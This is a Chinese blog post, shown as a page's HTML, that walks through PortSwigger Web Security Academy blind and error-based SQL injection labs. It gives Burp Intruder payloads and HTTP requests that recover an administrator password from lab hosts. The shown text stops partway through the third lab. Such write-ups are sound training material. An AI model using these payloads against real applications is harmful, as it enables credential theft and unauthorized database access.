<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy æ˜¯ Burp Suite å®˜æ–¹æ¨å‡ºçš„å…è´¹ Web å®‰å…¨å­¦ä¹ é¶åœºï¼Œåœ¨å­¦ä¹  Web å®‰å…¨çŸ¥è¯†çš„åŒæ—¶ï¼Œè¿˜å¯ä»¥ç»ƒä¹  Burp Suite çš„å®æˆ˜æŠ€èƒ½ã€‚ æœ¬ç¯‡æ–‡ç« è®²è§£ Web Security Academy ä¹‹ä¸­çš„ SQL Injectionï¼ˆSQL æ³¨å…¥æ¼æ´ï¼‰ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Burp Web Academy SQL æ³¨å…¥ï¼ˆäºŒï¼‰">
<meta property="og:url" content="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/index.html">
<meta property="og:site_name" content="SecDroid">
<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy æ˜¯ Burp Suite å®˜æ–¹æ¨å‡ºçš„å…è´¹ Web å®‰å…¨å­¦ä¹ é¶åœºï¼Œåœ¨å­¦ä¹  Web å®‰å…¨çŸ¥è¯†çš„åŒæ—¶ï¼Œè¿˜å¯ä»¥ç»ƒä¹  Burp Suite çš„å®æˆ˜æŠ€èƒ½ã€‚ æœ¬ç¯‡æ–‡ç« è®²è§£ Web Security Academy ä¹‹ä¸­çš„ SQL Injectionï¼ˆSQL æ³¨å…¥æ¼æ´ï¼‰ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://secdroid.github.io/images/burp-intruder-blind-sql-injection.png">
<meta property="og:image" content="https://secdroid.github.io/images/burp-intruder-blind-sql-injection-2.png">
<meta property="article:published_time" content="2025-03-08T03:33:04.626Z">
<meta property="article:modified_time" content="2025-03-08T03:31:53.000Z">
<meta property="article:author" content="Livermore">
<meta property="article:tag" content="SQL Injection">
<meta property="article:tag" content="Burp Intruder">
<meta property="article:tag" content="Burp Collaborator">
<meta property="article:tag" content="Blind Injection">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://secdroid.github.io/images/burp-intruder-blind-sql-injection.png">


<link rel="canonical" href="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/","path":"2025/03/08/burp-web-academy-sql-injection-part2/","title":"Burp Web Academy SQL æ³¨å…¥ï¼ˆäºŒï¼‰"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Burp Web Academy SQL æ³¨å…¥ï¼ˆäºŒï¼‰ | SecDroid</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">SecDroid</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>é“¾æ¥</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SQL-Injection"><span class="nav-number">2.</span> <span class="nav-text">0x02. SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Blind-SQL-injection-with-conditional-responses"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Blind SQL injection with conditional responses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-Blind-SQL-injection-with-conditional-errors"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: Blind SQL injection with conditional errors</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Visible-error-based-SQL-injection"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Visible error-based SQL injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Blind-SQL-injection-with-time-delays"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Blind SQL injection with time delays</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: Blind SQL injection with time delays and information retrieval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-Blind-SQL-injection-with-out-of-band-interaction"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: Blind SQL injection with out-of-band interaction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: Blind SQL injection with out-of-band data exfiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Lab-SQL-injection-with-filter-bypass-via-XML-encoding"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 Lab: SQL injection with filter bypass via XML encoding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. å°ç»“</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. å‚è€ƒæ–‡æ¡£</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Livermore</p>
  <div class="site-description" itemprop="description">SecDroid's Diary</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">41</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Livermore">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SecDroid">
      <meta itemprop="description" content="SecDroid's Diary">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Burp Web Academy SQL æ³¨å…¥ï¼ˆäºŒï¼‰ | SecDroid">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Burp Web Academy SQL æ³¨å…¥ï¼ˆäºŒï¼‰
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2025-03-08 11:33:04 / ä¿®æ”¹æ—¶é—´ï¼š11:31:53" itemprop="dateCreated datePublished" datetime="2025-03-08T11:33:04+08:00">2025-03-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
        </span>
          ï¼Œ
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
          ï¼Œ
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy æ˜¯ <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite å®˜æ–¹æ¨å‡ºçš„å…è´¹ Web å®‰å…¨å­¦ä¹ é¶åœºï¼Œåœ¨å­¦ä¹  Web å®‰å…¨çŸ¥è¯†çš„åŒæ—¶ï¼Œè¿˜å¯ä»¥ç»ƒä¹  Burp Suite çš„å®æˆ˜æŠ€èƒ½ã€‚</p>
<p>æœ¬ç¯‡æ–‡ç« è®²è§£ <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> ä¹‹ä¸­çš„ SQL Injectionï¼ˆSQL æ³¨å…¥æ¼æ´ï¼‰ã€‚</p>
<span id="more"></span>

<ul>
<li><a href="https://secdroid.github.io/2025/03/05/burp-web-academy-sql-injection/">Burp Web Academy SQL æ³¨å…¥</a></li>
<li><a href="https://secdroid.github.io/2025/03/08/burp-web-academy-sql-injection-part2/">Burp Web Academy SQL æ³¨å…¥ï¼ˆäºŒï¼‰</a></li>
</ul>
<h2 id="0x02-SQL-Injection"><a href="#0x02-SQL-Injection" class="headerlink" title="0x02. SQL Injection"></a>0x02. SQL Injection</h2><h3 id="2-1-Lab-Blind-SQL-injection-with-conditional-responses"><a href="#2-1-Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="2.1 Lab: Blind SQL injection with conditional responses"></a>2.1 Lab: Blind SQL injection with conditional responses</h3><blockquote>
<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
<p>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a <code>Welcome back</code> message in the page if the query returns any rows.</p>
<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
<p>To solve the lab, log in as the <code>administrator</code> user.</p>
<p><em>You can assume that the password only contains lowercase, alphanumeric characters.</em></p>
</blockquote>
<p>Blind SQL Injection å³<strong>ç›²æ³¨</strong>ï¼ŒæŒ‡æ²¡æœ‰ä¿¡æ¯å›æ˜¾çš„åœºæ™¯ä¸‹çš„ SQL æ³¨å…¥ã€‚</p>
<p>Cookie å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>TrackingId=T6KH6I5if70PRMUs; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=r7vmrP73h1PwVnvBdtc0cZqfQagyyJLi; Secure; HttpOnly; SameSite=None</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11402</span><br></pre></td></tr></table></figure>

<p>æºå¸¦æ­£å¸¸çš„ <code>TrackingId</code> Cookie è®¿é—®ï¼Œä¼šæç¤º <code>Welcome back!</code>ï¼Œä¸€ç§ç®€å•çš„ç›²æ³¨æµ‹è¯•æ–¹æ³•ï¼š</p>
<ul>
<li>å‘é€ <code>TrackingId=T6KH6I5if70PRMUs&#39; and 1=2--</code>ï¼Œæ²¡æœ‰ <code>Welcome back!</code></li>
<li>å‘é€ <code>TrackingId=T6KH6I5if70PRMUs&#39; and 1=1--</code>ï¼Œè¿”å› <code>Welcome back!</code></li>
</ul>
<p>è¯´æ˜ SQL æ³¨å…¥æ˜¯å­˜åœ¨çš„ï¼åç»­æµ‹è¯• Payload å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=T6KH6I5if70PRMUs&#x27; union select null--</span><br><span class="line">TrackingId=T6KH6I5if70PRMUs&#x27; union select &#x27;test&#x27;--</span><br><span class="line">TrackingId=T6KH6I5if70PRMUs&#x27; union select concat(username,&#x27;|&#x27;,password) from users--</span><br></pre></td></tr></table></figure>

<p>å¾ˆé—æ†¾ï¼Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸èƒ½æŠŠæŸ¥è¯¢åˆ°çš„æ•°æ®è¿”å›ç»™æ”»å‡»è€…ã€‚éœ€è¦å†æ¬¡åˆ©ç”¨ç›²æ³¨æ¥çˆ†ç ´ <code>administrator</code> ç”¨æˆ·çš„å¯†ç ï¼Œæ ¹æ®æç¤ºï¼Œå¯†ç å­—ç¬¦åªåŒ…å«å°å†™å­—æ¯å’Œæ•°å­—ã€‚æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€äº›å·²çŸ¥ä¿¡æ¯ï¼Œåªéœ€è¦åŸºäº <code>select password from users where username=&#39;administrator&#39;</code> åšä¸€äº›é¢å¤–çš„åˆ¤æ–­ï¼š</p>
<ul>
<li>å¯†ç çš„é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿ</li>
<li>å¯†ç ä¸­æ¯ä¸ªå­—ç¬¦åˆæ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ul>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ¤æ–­å¯†ç å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåœ¨ <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> ä¸­ä½¿ç”¨å¦‚ä¸‹æ¨¡æ¿è¿›è¡Œçˆ†ç ´ï¼Œå¯ä»¥åˆ¤æ–­å‡ºå¯†ç é•¿åº¦ä¸º <code>20</code>ã€‚</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a510088044b92e48542530d00610044.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=X&#x27; OR (select &#x27;a&#x27; from users where username=&#x27;administrator&#x27; and length(password)=Â§1Â§)=&#x27;a&#x27;--; session=hepiAR5rSEd4nFgU6SxuKgYzgClLRi2E</span><br></pre></td></tr></table></figure>

<p>éšåï¼Œæˆ‘ä»¬è¦ä¾æ¬¡åˆ¤æ–­å¯†ç å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦çš„å€¼ï¼ˆä½¿ç”¨ Cluster bomb æ¨¡å¼ï¼‰ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a510088044b92e48542530d00610044.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=X&#x27; OR (select &#x27;a&#x27; from users where username=&#x27;administrator&#x27; and substring(password,Â§1Â§,1)=&#x27;Â§0Â§&#x27;)=&#x27;a&#x27;--; session=hepiAR5rSEd4nFgU6SxuKgYzgClLRi2E</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚å‘é€æ¬¡æ•°ä¸º <code>length(password) * (26 + 10) = 20 * 36 = 720</code>ã€‚çˆ†ç ´å®Œæˆåï¼Œå¯¹ç»“æœè¿›è¡Œç­›é€‰åæ’åºï¼Œå³å¯æ¢å¤å‡ºå¯†ç çš„å†…å®¹ï¼š</p>
<p><img src="/images/burp-intruder-blind-sql-injection.png" alt="Burp Intruder Blind SQL Injection"></p>
<h3 id="2-2-Lab-Blind-SQL-injection-with-conditional-errors"><a href="#2-2-Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="2.2 Lab: Blind SQL injection with conditional errors"></a>2.2 Lab: Blind SQL injection with conditional errors</h3><blockquote>
<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.</p>
<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
<p>To solve the lab, log in as the <code>administrator</code> user.</p>
</blockquote>
<p>æ¼æ´è·Ÿå‰åº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡æ²¡æœ‰ä»»ä½•å›æ˜¾äº†ï¼Œåªèƒ½é é”™è¯¯ä¿¡æ¯æ¥æ¨æµ‹ã€‚è¿™é‡Œå¦‚æœ SQL æ‰§è¡Œå‡ºé”™ï¼Œä¼šè¿”å› <code>HTTP/2 500 Internal Server Error</code>ã€‚</p>
<p>é¢˜ç›®æç¤ºè¿™æ˜¯ä¸€ä¸ª Oracle æ•°æ®åº“ï¼ŒOracle SQL æ”¯æŒä½¿ç”¨ <code>||</code> æ¥è¿æ¥å­—ç¬¦ä¸²ã€‚æ­¤å¤–ï¼Œåœ¨ Oracle ä¸­ï¼Œæœ‰ä¸€ä¸ª <code>dual</code> è¡¨ç”¨äºæµ‹è¯•ï¼š</p>
<blockquote>
<p><code>DUAL</code> è¡¨æœ¬èº«åªæœ‰ä¸€è¡Œï¼Œå¹¶ä¸”è¿™è¡Œæ•°æ®é€šå¸¸åŒ…å«ä¸€ä¸ªä¼ªåˆ—ï¼ˆè™šæ‹Ÿåˆ—ï¼‰ï¼Œå…¶åç§°ä¸º <code>DUMMY</code>ï¼Œä¸”å…¶å€¼é€šå¸¸ä¸º <code>&#39;X&#39;</code>ã€‚è¿™æ„å‘³ç€ <code>DUAL</code> è¡¨å®é™…ä¸Šå¹¶ä¸åŒ…å«ä»»ä½•å®é™…ä¸šåŠ¡æ•°æ®ï¼Œè€Œæ˜¯ç”¨äºæ‰§è¡Œå„ç§SQLæ“ä½œæ—¶çš„å ä½ç¬¦ã€‚</p>
</blockquote>
<p>åˆ¤æ–­ SQL æ³¨å…¥ï¼š</p>
<ul>
<li><code>TrackingId=&#39;</code> è¿”å› <code>500</code></li>
<li><code>TrackingId=&#39; AND 1=1--</code> è¿”å› <code>200</code></li>
</ul>
<p>è¿˜æ˜¯å‚è€ƒ SQL Injection Cheat Sheetï¼Œæµ‹è¯•å¦‚ä¸‹è¯­å¥ï¼Œè¿”å› <code>500</code>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union SELECT CASE WHEN (length(username)=13) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>è€Œå¦‚æœæŠŠé•¿åº¦æ”¹æˆ <code>13</code> ä»¥å¤–çš„å…¶ä»–å€¼ï¼Œåˆ™è¿”å› <code>200</code>ï¼Œè¯´æ˜ Payload æ¨¡æ¿æ˜¯ OK çš„ã€‚è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯åˆ©ç”¨<strong>é™¤é›¶é”™è¯¯</strong>æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œå…ˆä½¿ç”¨ <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> æ¥çˆ†ç ´å¯†ç å­—æ®µçš„é•¿åº¦ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27; union SELECT CASE WHEN (length(password)=Â§0Â§) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#x27;administrator&#x27;--; session=onKvT4PGNADwgSnNH9ExSZIiS9zQEtuj</span><br></pre></td></tr></table></figure>

<p>å¾—å‡ºé•¿åº¦æ˜¯ <code>20</code>ï¼Œç„¶åä½¿ç”¨ Cluster bomb æ¨¡å¼æ¥çˆ†ç ´å¯†ç ï¼ˆæ³¨æ„ Oracle ä¸­ä½¿ç”¨ <code>substr</code> è€Œä¸æ˜¯ <code>substring</code>ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union SELECT CASE WHEN (substr(password,Â§0Â§,1)=&#x27;Â§0Â§&#x27;) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´ç»“æœï¼š</p>
<p><img src="/images/burp-intruder-blind-sql-injection-2.png" alt="Burp Intruder Blind SQL Injection"></p>
<p>å®˜æ–¹è§£æ³•æ²¡æœ‰ä½¿ç”¨ <code>union</code>ï¼Œè€Œæ˜¯ä½¿ç”¨ <code>||</code> æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=xyz&#x27;||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-Lab-Visible-error-based-SQL-injection"><a href="#2-3-Lab-Visible-error-based-SQL-injection" class="headerlink" title="2.3 Lab: Visible error-based SQL injection"></a>2.3 Lab: Visible error-based SQL injection</h3><blockquote>
<p>This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.</p>
<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. To solve the lab, find a way to leak the password for the <code>administrator</code> user, then log in to their account.</p>
</blockquote>
<p>æµ‹è¯•å¦‚ä¸‹æ•°æ®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=N0uh37abFCkNE6EZ&#x27;; session=V0QMalc9YRkLZzqq8aZiEKM0FiL2SL9o</span><br></pre></td></tr></table></figure>

<p>HTML é¡µé¢æç¤ºé”™è¯¯ä¿¡æ¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = &#x27;N0uh37abFCkNE6EZ&#x27;&#x27;. Expected  char</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé¢˜ç›®æ˜¯åˆ©ç”¨ <code>cast</code> æŠ›å‡ºå¼‚å¸¸æ¥æ³„éœ²ä¿¡æ¯ï¼ŒåŒæ—¶ SQL æŸ¥è¯¢å­—ç¬¦ä¸²è¿˜æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥è§£æ³•æœ‰ç‚¹å–å·§ã€‚</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a84005803fd90048144cb7e000e00b8.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27;%3bselect cast(username as int) from users limit 1--; session=szltq7Fk49jedcl3hp0Lg6IPGy3rtTN3</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨äº† <code>;</code> å³ <code>%3B</code> æ¥åˆ†éš” SQL è¯­å¥ï¼Œé€šè¿‡ <code>limit 1</code> æ¥æ³„éœ²ç¬¬ä¸€æ¡æ•°æ®ï¼Œå®é™…ä¸Šå°±æ˜¯ <code>administrator</code>ã€‚</p>
<p>è€Œå¦‚æœä¸è€ƒè™‘é•¿åº¦ï¼Œå¯ä»¥æµ‹è¯• <code>union</code>ï¼š</p>
